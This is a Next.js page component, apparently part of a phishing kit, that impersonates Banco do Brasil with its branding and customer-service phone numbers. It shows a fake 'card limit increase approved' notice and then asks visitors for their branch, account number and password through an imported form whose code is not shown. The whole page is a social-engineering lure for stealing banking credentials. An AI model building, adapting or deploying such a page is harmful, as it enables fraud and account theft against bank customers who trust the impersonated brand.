import Head from 'next/head'
import Image from 'next/image'
import styles from '../styles/Home.module.css'
import 'bootstrap/dist/css/bootstrap.min.css';

import Menu from '../component/navbar';
import Formulario from '../component/form';

import { Navbar } from 'reactstrap';

import  logo from '../component/img/logo.jpeg';
import {
  Card, CardImg, CardText, CardBody,
  CardTitle, CardSubtitle,Button, Alert, Container
} from 'reactstrap';

export default function Home() {
  return (
    <div>
      <Menu />
      <Container>
      <Card className={styles.card0}>
   
        <CardBody className={styles.cardbody}>
          <CardTitle className={styles.titulo1} tag="h5">Aumento aprovado! de limite de cartão</CardTitle>
          <CardSubtitle tag="h6" className="mb-2 text-muted">para prosseguir com liberação acesse sua conta.
  Esse serviço é gratuito e traz mais comodidade pra você</CardSubtitle>
          <CardText>
        <p>Central de Relacionamento BB <b>4004 0001 </b> 
              Capitais e regiões metropolitanas <b>0800 729 0001 </b>Demais localidades</p>
          </CardText>
        </CardBody>
      </Card>
      </Container>
      <Container>
      <Card className={styles.card2}>
        <CardBody>
          <CardTitle className={styles.titulo2} tag="h1">Qual sua agência, conta e senha? </CardTitle>
<Formulario></Formulario>
        </CardBody>
      </Card>
      </Container>
    
 </div>

  )
}
